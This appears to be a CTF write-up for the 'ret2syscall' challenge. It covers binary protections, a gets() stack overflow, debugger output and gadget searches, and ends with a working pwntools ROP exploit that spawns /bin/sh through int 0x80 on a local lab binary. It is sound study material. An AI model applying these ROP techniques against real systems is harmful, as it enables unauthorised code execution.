# Analyze
```bash
# zhailin @ DESKTOP-4OQQP8F in ~/CTF_Challenges/Pwn/ret2syscall on git:main x [17:41:10] C:1
$ checksec --file=rop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY      Fortified        Fortifiable     FILE      
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2255) Symbols     No 0
0     
```
# IDA
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h] BYREF

  IO_setvbuf(stdout, 0, 2, 0);
  IO_setvbuf(stdin, 0, 1, 0);
  IO_puts("This time, no system() and NO SHELLCODE!!!");
  IO_puts("What do you plan to do?");
  IO_gets(&v4);
  return 0;
}
```

# Debug
```bash
pwndbg> b *0x08048E96
Breakpoint 1 at 0x8048e96: file rop.c, line 15.
pwndbg> r
Starting program: /home/zhailin/CTF_Challenges/Pwn/ret2syscall/rop
This time, no system() and NO SHELLCODE!!!
What do you plan to do?

Breakpoint 1, 0x08048e96 in main () at rop.c:15
15      rop.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
 EAX  0xffffd2ac ◂— 3
 EBX  0x80481a8 (_init) ◂— push ebx
 ECX  0x80eb4d4 (_IO_stdfile_1_lock) ◂— 0
 EDX  0x18
 EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]
 ESI  0
 EBP  0xffffd318 —▸ 0x8049630 (__libc_csu_fini) ◂— push ebx
 ESP  0xffffd290 —▸ 0xffffd2ac ◂— 3
 EIP  0x8048e96 (main+114) ◂— call gets
──────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────
 ► 0x8048e96 <main+114>    call   gets                        <gets>
        arg[0]: 0xffffd2ac ◂— 3
        arg[1]: 0
        arg[2]: 1
        arg[3]: 0

   0x8048e9b <main+119>    mov    eax, 0     EAX => 0
   0x8048ea0 <main+124>    leave
   0x8048ea1 <main+125>    ret

   0x8048ea2               nop
   0x8048ea4               nop
   0x8048ea6               nop
   0x8048ea8               nop
   0x8048eaa               nop
   0x8048eac               nop
   0x8048eae               nop
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ esp 0xffffd290 —▸ 0xffffd2ac ◂— 3
01:0004│-084 0xffffd294 ◂— 0
02:0008│-080 0xffffd298 ◂— 1
03:000c│-07c 0xffffd29c ◂— 0
04:0010│-078 0xffffd2a0 ◂— 1
05:0014│-074 0xffffd2a4 —▸ 0xffffd3a4 —▸ 0xffffd4ef ◂— '/home/zhailin/CTF_Challenges/Pwn/ret2syscall/rop'
06:0018│-070 0xffffd2a8 —▸ 0xffffd3ac —▸ 0xffffd520 ◂— 'HOSTTYPE=x86_64'
07:001c│ eax 0xffffd2ac ◂— 3
────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► 0 0x8048e96 main+114
   1 0x804907a __libc_start_main+458
   2 0x8048d2b _start+33
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
     Start        End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
 0x8048000  0x80e9000 r-xp    a1000       0 rop
 0x80e9000  0x80eb000 rw-p     2000   a0000 rop
 0x80eb000  0x810f000 rw-p    24000       0 [heap]
0xf7ff8000 0xf7ffc000 r--p     4000       0 [vvar]
0xf7ffc000 0xf7ffe000 r-xp     2000       0 [vdso]
0xfffdd000 0xffffe000 rw-p    21000       0 [stack]
```

*We need to control `eax`, `ebx`, `ecx`, `edx`.*
# Find the gadgets to control the `eax` register
```bash
# zhailin @ DESKTOP-4OQQP8F in ~/CTF_Challenges/Pwn/ret2syscall on git:main x [18:00:11]
$ ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```
use the second as the gadgets to control `eax`

# Find the gadgets to control other register.
```bash
# zhailin @ DESKTOP-4OQQP8F in ~/CTF_Challenges/Pwn/ret2syscall on git:main x [18:06:23]
$ ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

```bash
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

```bash
# zhailin @ DESKTOP-4OQQP8F in ~/CTF_Challenges/Pwn/ret2syscall on git:main x [18:08:25]
$ ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh

# zhailin @ DESKTOP-4OQQP8F in ~/CTF_Challenges/Pwn/ret2syscall on git:main x [18:10:20]
$ ROPgadget --binary rop  --only 'int'        
Gadgets information
============================================================
0x08049421 : int 0x80
0x080890b5 : int 0xcf

Unique gadgets found: 2
```


# Exploit
```python
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```